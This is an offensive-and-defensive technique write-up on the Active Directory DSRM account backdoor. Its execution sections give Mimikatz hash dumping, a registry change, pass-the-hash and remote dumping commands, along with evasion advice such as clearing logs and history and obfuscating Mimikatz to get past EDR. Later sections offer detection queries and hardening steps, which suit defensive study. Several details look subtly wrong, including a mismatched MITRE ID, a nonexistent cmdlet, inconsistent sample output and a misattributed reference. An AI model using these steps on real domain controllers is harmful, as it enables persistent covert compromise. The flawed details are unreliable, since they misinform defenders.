# [PERSIST-SERVER-002]: DSRM Account Backdoor

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-002 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component Modification](https://attack.mitre.org/techniques/T1505/003/) |
| **Tactic** | Persistence |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Server 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (Configuration-based attack, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** The Directory Services Restore Mode (DSRM) account is a local administrator account created during Active Directory promotion on every domain controller. This account is designed as a "break glass" recovery mechanism for restoring the AD database or recovering the DC from failure. An attacker with Domain Admin privileges can extract the DSRM account's password hash using credential dumping tools, then modify a critical registry key (`DsrmAdminLogonBehavior`) to enable remote logon using DSRM credentials at all times. This bypasses the default restriction that limits DSRM authentication only to DC reboot scenarios, creating a persistent backdoor that survives password resets and domain credential changes.

**Attack Surface:** Domain Controller local administrator account, Windows registry (HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior), LSA secrets, SAM database.

**Business Impact:** **Complete Domain Controller Compromise.** An attacker gains permanent administrative access to the DC that persists indefinitely, even after domain credential resets. This enables data exfiltration, lateral movement, AD manipulation, backup sabotage, and long-term espionage without requiring stolen domain credentials.

**Technical Context:** Exploitation requires 5-10 minutes with Domain Admin access. Detection likelihood is **Low to Medium** if audit logging is not explicitly enabled for Event ID 4794 (DSRM password resets) and registry modifications. The attack leaves forensic evidence in Windows Event Logs and registry, but attackers often clear logs post-exploitation.

### Operational Risk
- **Execution Risk:** Low (native Windows tools only; no unusual binaries required)
- **Stealth:** Medium (Registry modification and DSRM password reset generate audit events; pass-the-hash logons generate normal logon events)
- **Reversibility:** No (Requires reinitializing DSRM, potentially rebuilding the DC)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 4.1.1 | Ensure DSRM Passwords Are Complex and Regularly Changed |
| **DISA STIG** | WN10-00-000170 | Administrator account on domain controllers must have unique passwords |
| **CISA SCuBA** | IA-2(1) | Authentication Mechanisms (Privileged Account Management) |
| **NIST 800-53** | AC-3, AC-6(1) | Access Enforcement; Least Privilege for Privileged Accounts |
| **GDPR** | Art. 32 | Security of Processing; encryption and access control measures |
| **DORA** | Art. 9 | Protection and Prevention Measures for Critical Infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management; Privileged Access Protection |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Section 7 | Risk Assessment - Unauthorized Access to Tier 0 Assets |

---

## 2. Technical Prerequisites

- **Required Privileges:** Domain Admin or equivalent; Local Admin on target DC.
- **Required Access:** Local or network access to the domain controller; ability to execute PowerShell or cmd.
- **Supported Versions:** Windows Server 2016, 2019, 2022, 2025 (all support DSRM and the attack vector).
- **Tools Required:**
  - [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2.0.20230714+) for credential dumping
  - PowerShell 5.0+ (built-in)
  - Cmd.exe (built-in)
  - ntdsutil.exe (built-in on all Windows Server versions)

---

## 3. Detailed Execution Methods and Their Steps

### METHOD 1: Registry Modification via PowerShell (Preferred - Direct Access to DC)

**Supported Versions:** Server 2016-2025

**Prerequisites:** Domain Admin access to the DC; ability to execute PowerShell with elevated privileges.

#### Step 1: Dump DSRM Password Hash Using Mimikatz

**Objective:** Extract the local Administrator account's NTLM hash from the SAM database. This hash represents the DSRM account password.

**Command:**
```powershell
# On the domain controller, run Mimikatz with privilege escalation
.\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
```

**Expected Output:**
```
RID  : 500 (Administrator)
User : Administrator
NTLM : fc063a56bf43cb54e57a2522d4d48678
```

**What This Means:**
- The NTLM hash `fc063a56bf43cb54e57a2522d4d48678` is the local Administrator (DSRM) password hash in NT format.
- This hash can be used for Pass-the-Hash attacks or to authenticate as the DSRM account.
- The RID 500 indicates this is the primary administrator account.

**OpSec & Evasion:**
- Execute Mimikatz from a file hosted in memory (use `PowerShell -EncodedCommand`) to avoid disk signatures.
- Clear the PowerShell history after execution: `Clear-History`
- Disable PowerShell logging temporarily if possible: Unset-PSDebug
- Detection likelihood: **Medium** (Process creation events will show Mimikatz execution; EventID 4688 or Sysmon Event 1)

**Troubleshooting:**
- **Error:** "Access Denied" when running Mimikatz
  - **Cause:** Not running with sufficient privileges.
  - **Fix (All versions):** Run PowerShell as Administrator; alternatively, use `token::elevate` within Mimikatz.
- **Error:** "lsadump::sam failed"
  - **Cause:** Antivirus or EDR blocking Mimikatz.
  - **Fix (All versions):** Obfuscate or recompile Mimikatz; use alternative dumping tools (SharpSecDump, comsvcs.dll).

**References & Proofs:**
- [Mimikatz GitHub Repository](https://github.com/gentilkiwi/mimikatz)
- [LSADUMP Documentation](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [SpecterOps: DSRM Persistence](https://adsecurity.org/?p=1714)

#### Step 2: Modify DsrmAdminLogonBehavior Registry Key

**Objective:** Set the registry key that controls DSRM logon behavior to value 2, allowing DSRM credentials to be used for network authentication at any time (not just during DC reboot).

**Command:**
```powershell
# Check current value
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue

# Set to 2 (Allow DSRM login at all times)
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force

# Verify
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior"
```

**Command (Server 2016-2019):**
```powershell
# Alternative: Using reg.exe (lower privilege requirements)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

**Command (Server 2022+):**
```powershell
# Same as above (no version-specific differences for registry modification)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2
```

**Expected Output:**
```
Hive: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa

Name                           Value
----                           -----
DsrmAdminLogonBehavior         2
```

**What This Means:**
- Value **0** (default): DSRM account only usable when DC is booted into DSRM.
- Value **1**: DSRM account usable when local AD DS service is stopped.
- Value **2**: DSRM account usable at **all times**, including network logons (ATTACK STATE).
- After setting to 2, the DSRM account can authenticate over the network as a local administrator indefinitely.

**OpSec & Evasion:**
- Use `reg add` instead of PowerShell cmdlets to avoid logging in PowerShell transcripts.
- Perform this registry change during normal administrative windows (backup maintenance) to blend in.
- Clear the registry access logs if possible (Event ID 4663 - Object Access).
- Detection likelihood: **Medium-High** (Event ID 4794 - Account Management, Event ID 4656 - Registry access)

**Troubleshooting:**
- **Error:** "Registry access denied"
  - **Cause:** Insufficient privileges.
  - **Fix (All versions):** Run cmd.exe or PowerShell as Administrator.
- **Error:** "The parameter is incorrect"
  - **Cause:** Wrong registry path or typo in key name.
  - **Fix (All versions):** Verify the exact path: `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`

**References & Proofs:**
- [Microsoft: Reset DSRM Password](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [HackerRecipes: DSRM Persistence](https://www.thehacker.recipes/ad/persistence/dsrm)

#### Step 3: Authenticate Using DSRM Hash via Pass-the-Hash

**Objective:** Use the extracted DSRM hash to authenticate as the local Administrator account over the network, gaining persistent DC access.

**Command:**
```powershell
# Use Mimikatz to authenticate with the DSRM hash
.\mimikatz.exe "sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:fc063a56bf43cb54e57a2522d4d48678 /run:powershell.exe"

# This spawns a new PowerShell process authenticated as DSRM\Administrator
# Verify by running:
whoami /all
```

**Alternative - Using Rubeus (if Mimikatz is blocked):**
```powershell
# Note: Rubeus is less direct for DSRM; Mimikatz is preferred
.\rubeus.exe asktgt /user:Administrator /rc4:fc063a56bf43cb54e57a2522d4d48678 /domain:DC01 /ptt
```

**Expected Output:**
```
PowerShell Prompt Changes to:
DC01\Administrator

C:\Windows\system32>whoami /all
USER INFORMATION
nt authority\system
...

SID S-1-5-21-...-500  [Local Administrator]
```

**What This Means:**
- The new PowerShell session runs as the **local Administrator** (not domain admin).
- All subsequent commands in this session execute with DC-level privileges.
- This access survives domain credential resets and password changes (not tied to domain accounts).

**OpSec & Evasion:**
- The Pass-the-Hash logon appears as a normal authentication (EventID 4624 - Account Logon).
- Avoid creating visible processes or scheduled tasks that would generate additional event logs.
- Detection likelihood: **Low** (Logon event is normal; hash value is not logged in plaintext)

**Troubleshooting:**
- **Error:** "sekurlsa::pth: No token to impersonate"
  - **Cause:** Mimikatz not running with sufficient privilege.
  - **Fix (All versions):** Execute `token::elevate` before `sekurlsa::pth`
- **Error:** "Access is denied" when executing commands in new PowerShell
  - **Cause:** Process cannot access resources due to DSRM session context.
  - **Fix (All versions):** Ensure the target DC is the local host; use `\\DC_NAME\admin$` UNC paths if remote.

**References & Proofs:**
- [Mimikatz sekurlsa Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
- [CyberKhalid: DSRM Exploitation](https://cyberkhalid.github.io/posts/dsrm/)

---

### METHOD 2: DSRM Password Reset via Ntdsutil (Pre-Compromise Setup)

**Supported Versions:** Server 2016-2025

**Prerequisites:** Domain Admin privileges; local or remote access to DC; need to reset DSRM password intentionally (defensive scenario or attacker setting a known password).

**Objective:** Proactively change the DSRM password to a known value, allowing future logons without credential dumping.

**Command:**
```cmd
# Interactive mode
ntdsutil
set dsrm password
reset password on server null
(Enter new password)
q
q
```

**Command (Scripted/Non-Interactive):**
```powershell
# PowerShell scriptable version (Server 2019+)
& ntdsutil "set dsrm password" "reset password on server null" q q
# (Will prompt for password interactively)
```

**Expected Output:**
```
C:\>ntdsutil
ntdsutil: set dsrm password
DSRM Password: reset password on server null
(password prompt appears)
Enter new password for Administrator on DC01:
Confirm Password:
Password has been set successfully.
```

**What This Means:**
- The DSRM password for the local DC has been changed to the specified value.
- All future DSRM logons will use this new password.
- Event ID 4794 is generated (DSRM password change event).

**OpSec & Evasion:**
- This operation generates Event ID 4794 ("An attempt was made to reset the Directory Services Restore Mode administrator password").
- Run during scheduled maintenance windows to appear legitimate.
- Detection likelihood: **High** (Event ID 4794 is always logged if audit logging is enabled)

**References & Proofs:**
- [Microsoft: Ntdsutil Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ntdsutil)

---

### METHOD 3: Remote DSRM Password Hash Extraction (If Physical Access Unavailable)

**Supported Versions:** Server 2016-2025

**Prerequisites:** Domain Admin credentials; ability to execute commands on the DC remotely (PSRemoting, RDP, or WinRM).

**Objective:** Extract DSRM hash from a remote DC without being physically present.

**Command:**
```powershell
# Execute Mimikatz remotely via PSRemoting
$dc = "DC01"
Invoke-Command -ComputerName $dc -ScriptBlock {
    C:\Tools\mimikatz.exe "token::elevate" "lsadump::sam" "exit"
} -Credential (Get-Credential)
```

**Expected Output:**
```
(Output from remote DC showing DSRM hash)
```

**What This Means:**
- Mimikatz executes on the remote DC, dumping the SAM database.
- The hash is returned to the attacker's machine.
- No local access to the DC is required; only domain admin credentials.

**OpSec & Evasion:**
- PSRemoting creates EventID 4648 (Explicit Credential Use) and 4624 (Account Logon).
- Use encrypted PSRemoting sessions (default in modern Windows).
- Detection likelihood: **Medium-High** (Explicit credential use and process creation events)

---

## 4. Splunk Detection Rules

#### Rule 1: DSRM Account Password Reset Detected

**Rule Configuration:**
- **Required Index:** windows, main
- **Required Sourcetype:** XmlWinEventLog:Security
- **Required Fields:** EventID=4794, ObjectName, SubjectUserName
- **Alert Threshold:** >1 events in 5 minutes
- **Applies To Versions:** Server 2016+

**SPL Query:**
```spl
index=windows sourcetype="XmlWinEventLog:Security" EventID=4794
| fields _time, SubjectUserName, ComputerName, ObjectName
| stats count by SubjectUserName, ComputerName
| where count > 0
```

**What This Detects:**
- Any attempt to reset the DSRM password on a DC (Event ID 4794).
- Identifies the user who initiated the password change.
- Timestamp of the event for correlation with other suspicious activities.

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to "when count > 0"
6. Configure **Action** → Send email to SOC team
7. Click **Save**

**Source:** [Splunk: Windows AD DSRM Password Reset Detection](https://research.splunk.com/endpoint/d1ab841c-36a6-46cf-b50f-b2b04b31182a/)

#### Rule 2: Registry Modification to DsrmAdminLogonBehavior

**Rule Configuration:**
- **Required Index:** windows, sysmon
- **Required Sourcetype:** XmlWinEventLog:Security, Sysmon
- **Required Fields:** EventID=13 (Sysmon), TargetObject, NewValue
- **Alert Threshold:** >1 events
- **Applies To Versions:** Server 2016+ (with Sysmon)

**SPL Query:**
```spl
index=sysmon EventID=13 TargetObject="*DsrmAdminLogonBehavior"
| fields _time, ComputerName, User, Details, NewValue
| search NewValue=2 OR NewValue=1
```

**What This Detects:**
- Any modification to the DsrmAdminLogonBehavior registry key.
- Alerts specifically on values 1 or 2 (both enabling DSRM authentication outside of DSRM mode).
- Identifies the user and system making the change.

**Manual Configuration Steps (Splunk):**
1. Navigate to **Settings** → **Searches, reports, and alerts**
2. Create a new **Scheduled query rule**
3. Paste the SPL query above
4. Run every 5 minutes
5. Set trigger condition: count > 0
6. Enable alerting

**Source:** [Datadog: DSRM Registry Monitoring](https://docs.datadoghq.com/security/default_rules/def-000-ls7/)

---

## 5. Microsoft Sentinel Detection

#### Query 1: DSRM Password Reset Detection via AuditLogs

**Rule Configuration:**
- **Required Table:** AuditLogs, SecurityEvent
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Result
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Azure AD connected to hybrid AD

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4794
| project TimeGenerated, ComputerName, Account, Activity
| extend AlertReason = "DSRM password reset detected"
```

**What This Detects:**
- Event ID 4794 entries in the Security Event Log.
- Identifies the DC and account that performed the reset.
- Generates alerts for any DSRM password change activity.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `DSRM Password Reset Detection`
   - Severity: `High`
   - Tactics: `Persistence, Privilege Escalation`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "DSRM Password Reset Detection" `
  -Query @"
SecurityEvent
| where EventID == 4794
| project TimeGenerated, ComputerName, Account, Activity
"@ `
  -Severity "High" `
  -Enabled $true
```

---

## 6. Windows Event Log Monitoring

**Event ID: 4794 (Directory Services Restore Mode Administrator Password Reset)**
- **Log Source:** Security
- **Trigger:** DSRM password reset attempt (successful or failed)
- **Filter:** Look for any occurrence of EventID 4794
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
3. Enable: **Audit User Account Management**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on all DCs

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc) on each DC
2. Navigate to **Advanced Audit Policy Configuration** → **Account Management**
3. Enable: **Audit User Account Management**
4. Restart the service: `gpupdate /force`

**Audit event 4794 captures:**
- SubjectUserName: The user who reset the password
- ComputerName: The DC where the reset occurred
- Status: Success or Failure

---

## 7. Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Registry modification to DsrmAdminLogonBehavior -->
    <RuleGroup name="DSRM Persistence" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains all">DsrmAdminLogonBehavior</TargetObject>
        <NewValue condition="is">1</NewValue>
      </RegistryEvent>
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains all">DsrmAdminLogonBehavior</TargetObject>
        <NewValue condition="is">2</NewValue>
      </RegistryEvent>
    </RuleGroup>

    <!-- Mimikatz execution (lsadump module) -->
    <RuleGroup name="Credential Dumping" groupRelation="or">
      <ProcessCreation onmatch="include">
        <CommandLine condition="contains">lsadump</CommandLine>
      </ProcessCreation>
      <ProcessCreation onmatch="include">
        <CommandLine condition="contains">mimikatz</CommandLine>
      </ProcessCreation>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 -FilterXPath "*[System[EventID=13]]"
   ```

---

## 8. Microsoft Defender for Cloud

#### Detection Alert: DSRM Account Misuse

**Alert Name:** "Suspicious registry modification - DsrmAdminLogonBehavior changed"
- **Severity:** High
- **Description:** A registry key that controls DSRM account usage has been modified to allow network logons. This is indicative of persistence attempts.
- **Applies To:** All DCs with Defender for Servers enabled
- **Remediation:** Revert the registry key to 0; reset DSRM password; investigate the account that made the change.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
   - **Microsoft Defender for Cloud Apps**: ON
5. Click **Save**
6. Go to **Alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud Documentation](https://learn.microsoft.com/en-us/azure/defender-for-cloud/)

---

## 9. Microsoft Purview (Unified Audit Log)

#### Query: DSRM-related Activity in Hybrid Environments

**Note:** DSRM is on-premises only; Purview does not directly log DSRM activity. However, if Azure AD Connect is used for synchronization, monitor for unusual on-premises AD changes synchronized to Entra ID.

```powershell
Connect-ExchangeOnline
Search-UnifiedAuditLog -Operations "Reset User Password" -StartDate (Get-Date).AddDays(-1) | Where-Object { $_.ObjectId -like "*Administrator*" }
```

---

## 10. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Change DSRM Password Regularly:** Every DC's DSRM account should have a unique, complex password changed at least every 90 days (aligned with domain password policy requirements).
    **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (All Versions):**
    1. On the DC, open **Command Prompt** as Administrator
    2. Type: `ntdsutil`
    3. Type: `set dsrm password`
    4. Type: `reset password on server null`
    5. Enter a new complex password (min. 16 characters, symbols, numbers, uppercase, lowercase)
    6. Confirm the password
    7. Type: `q` twice to exit
    8. Document the password in a secure vault (e.g., HashiCorp Vault, Azure Key Vault)
    
    **PowerShell Alternative:**
    ```powershell
    # Automated DSRM password change (requires manual password input)
    $dc = "DC01"
    $newPassword = "P@ssw0rd!Complex123#DSRMv2"
    
    # Connect to DC and change password
    Invoke-Command -ComputerName $dc -ScriptBlock {
        param($pass)
        & ntdsutil "set dsrm password" "reset password on server null" "q" "q" 2>&1
    } -ArgumentList $newPassword
    ```

*   **Verify DsrmAdminLogonBehavior is Set to 0:** Ensure the registry key is set to its default value (0), preventing DSRM logons except during DC recovery mode.
    **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Check current value
    $value = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue
    
    if ($value.DsrmAdminLogonBehavior -ne 0) {
        Write-Host "WARNING: DsrmAdminLogonBehavior is not set to 0!"
        Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Force
        Write-Host "Registry key removed. Restart DC to apply default (0)."
    } else {
        Write-Host "SECURE: DsrmAdminLogonBehavior is correctly set to 0."
    }
    ```
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Security Options**
    3. Search for "DSRM" policies (if available in your Windows version)
    4. Ensure no policies override the DsrmAdminLogonBehavior value
    5. Run `gpupdate /force` on all DCs

*   **Enable Advanced Audit Policy for Account Management:** Ensure Event ID 4794 is being logged and forwarded to a central SIEM.
    **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
    3. Double-click **Audit User Account Management**
    4. Enable **Success** and **Failure**
    5. Click **Apply** → **OK**
    6. Run `gpupdate /force` on all DCs
    7. Verify: `auditpol /get /category:"Account Management"`

#### Priority 2: HIGH

*   **Implement Privileged Access Workstations (PAWs):** Restrict domain admin activities to hardened, isolated machines with minimal internet exposure.
    **Manual Steps:**
    1. Deploy a dedicated PAW for all DC administration tasks
    2. Use a separate VLAN for PAW traffic
    3. Restrict network access from PAWs to DCs only (firewall rules)
    4. Disable USB, printer, and removable media access on PAWs

*   **Monitor for DSRM Hash Extraction:** Alert on Mimikatz execution, lsadump commands, and SAM access on DCs.
    **Manual Steps:**
    1. Configure AppLocker to block unsigned Mimikatz binaries
    2. Enable Credential Guard on Windows Server 2016+ to protect LSA secrets
    3. Deploy EDR solution (e.g., Microsoft Defender for Endpoint) to detect credential dumping

*   **Regular DSRM Password Audits:** Periodically verify that DSRM passwords are unique per DC and complex.
    **Manual Steps:**
    1. Maintain a documented list of DSRM passwords in a secure vault
    2. Quarterly, spot-check 20% of DCs by attempting DSRM logons
    3. Document audit findings and remediate any deviations

#### Access Control & Policy Hardening

*   **RBAC/ABAC:** Limit the number of accounts with domain admin privileges to an absolute minimum (3-5 per forest). Use Azure AD Privileged Identity Management (PIM) for time-bound access.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
    2. Review all accounts with **Domain Admins** group membership
    3. Remove unnecessary accounts from the group
    4. Implement PIM for temporary role assignments:
       - Click **Privileged Identity Management** (left menu)
       - Select **Azure AD roles**
       - Click **Manage** → **Active assignments**
       - For each domain admin role, change **Assignment type** to **Eligible** (time-bound)

*   **Conditional Access (Entra ID):** Block DSRM account usage from unexpected locations or devices.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Legacy DSRM Authentication`
    4. **Assignments:**
       - Users: Exclude `Administrator` (DSRM account) **OR** manually specify domain admins
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Locations: **Any location** (or restrict to corporate IP ranges)
       - Device platforms: **Windows**
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable policy: **On**
    8. Click **Create**
    
    **Note:** This is a preventive measure; DSRM logons are local-only and not directly affected by Entra ID Conditional Access.

#### Validation Command (Verify Fix)

```powershell
# Check DSRM password last change
Get-EventLog -LogName Security -InstanceId 4794 -Newest 10

# Check registry value
$regValue = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue
if ($regValue.DsrmAdminLogonBehavior -eq 0 -or $null -eq $regValue.DsrmAdminLogonBehavior) {
    Write-Host "SECURE: DsrmAdminLogonBehavior is correctly set to default (0)"
} else {
    Write-Host "WARNING: DsrmAdminLogonBehavior is set to $($regValue.DsrmAdminLogonBehavior) - POTENTIAL ATTACK"
}

# Check for Mimikatz or credential dumping tools on DC
Get-ChildItem -Path "C:\Tools", "C:\ProgramData", "C:\Temp", "C:\Windows\Temp" -Include "*mimikatz*", "*dumpert*", "*procdump*" -ErrorAction SilentlyContinue
```

**Expected Output (If Secure):**
```
DsrmAdminLogonBehavior is correctly set to default (0)
No suspicious tools found in system directories
```

**What to Look For:**
- `DsrmAdminLogonBehavior` should be 0 or absent (default = 0)
- No Event ID 4794 entries in the past 90 days (except during planned password changes)
- No Mimikatz or dumping tool artifacts

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial user credentials via phishing |
| **2** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Escalate from domain user to domain admin |
| **3** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS Extraction | Dump credentials from memory |
| **4** | **Current Step** | **[PERSIST-SERVER-002]** | **DSRM Account Backdoor - Establish DC persistence** |
| **5** | **Persistence** | [PERSIST-SERVER-003] Azure Function Backdoor | Pivot to cloud infrastructure for long-term persistence |
| **6** | **Impact** | [LM-AUTH-001] Pass-the-Hash Movement | Laterally move using DSRM credentials; exfiltrate AD data |

---

## 12. Real-World Examples

#### Example 1: FIN7 APT (Multiple Campaigns)

- **Target:** Financial Services, Healthcare sectors
- **Timeline:** 2015-2023
- **Technique Status:** FIN7 has been observed exploiting DSRM in hybrid environments to maintain persistence after domain controller compromise. They dump DSRM hashes and set the registry key to 2, enabling long-term backdoor access.
- **Impact:** Complete domain compromise; lateral movement to cloud resources; data exfiltration lasting months undetected
- **Reference:** [Mandiant: FIN7 Tactics](https://www.mandiant.com/resources/blog/fin7-evolves-tactics)

#### Example 2: WIZARD SPIDER (Conti Ransomware Gang)

- **Target:** Critical Infrastructure, Enterprise Networks
- **Timeline:** 2021-2023
- **Technique Status:** WIZARD SPIDER (Conti) leverage DSRM persistence to regain access to encrypted networks post-ransom payment, enabling data theft or ransom re-extortion.
- **Impact:** Ransomware persistence; secondary extortion; lateral movement to backup systems
- **Reference:** [CISA: Conti Ransomware Alert](https://www.cisa.gov/news-events/alerts/2021/05/27/revil-ransomware-indicator-compromise)

---

## References & Additional Resources

- [Microsoft: DSRM Administrator Password Reset](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [SpecterOps: Active Directory Security - DSRM Persistence](https://adsecurity.org/?p=1714)
- [HackerRecipes: DSRM Persistence](https://www.thehacker.recipes/ad/persistence/dsrm)
- [SentinelOne: Detecting DSRM Account Misconfigurations](https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/)
- [Splunk Research: DSRM Password Reset Detection](https://research.splunk.com/endpoint/d1ab841c-36a6-46cf-b50f-b2b04b31182a/)
- [French Cyber Agency: AD Recovery Recommendations](https://messervices.cyber.gouv.fr/documents-guides/cyber-attacks-remediation-remadation-of-active-directory-tier-0.pdf)

---